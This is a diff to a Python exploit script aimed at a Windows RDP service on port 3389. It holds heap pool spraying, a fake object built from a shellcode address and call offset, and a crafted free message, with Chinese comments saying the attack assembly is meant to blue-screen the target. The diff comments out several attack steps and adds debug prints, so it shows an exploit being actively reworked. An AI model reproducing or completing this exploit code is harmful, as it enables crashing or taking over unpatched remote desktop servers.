@@ -27,6 +27,8 @@ def pool_spray(s, crypter, payload):
 
 def main():
 
+
+    print("正在使用新代码 直接上传 2")
     # change to your target
     host = '192.168.1.106'
     port = 3389
@@ -173,21 +175,20 @@ def main():
     # fake_obj 攻击汇编语句 用于蓝屏
     print('[+] spraying pool')
     # pool_spray(s, crypter, payload)
-    pool_spray(s, crypter, outCode)
+    # pool_spray(s, crypter, outCode)
 
     ###################################################
 
-    fake_obj_size = 168
-    call_offset = 108
-    fake_obj = b'\x00'*call_offset + shellcode_address
-    fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))
+    # fake_obj_size = 168
+    # call_offset = 108
+    # fake_obj = b'\x00'*call_offset + shellcode_address
+    # fake_obj = fake_obj + b'\x00' * (fake_obj_size - len(fake_obj))
 
-    time.sleep(.5)
-    print('[+] sending free')
-    s.sendall(rdp.free_32(crypter))
-    time.sleep(.15)
+    # time.sleep(.5)
+    # print('[+] sending free')
+    # s.sendall(rdp.free_32(crypter))
+    # time.sleep(.15)
 
-    print("正在使用新代码 直接上传 1")
     # print('[+] allocating fake objects')
     # while count < times:
 
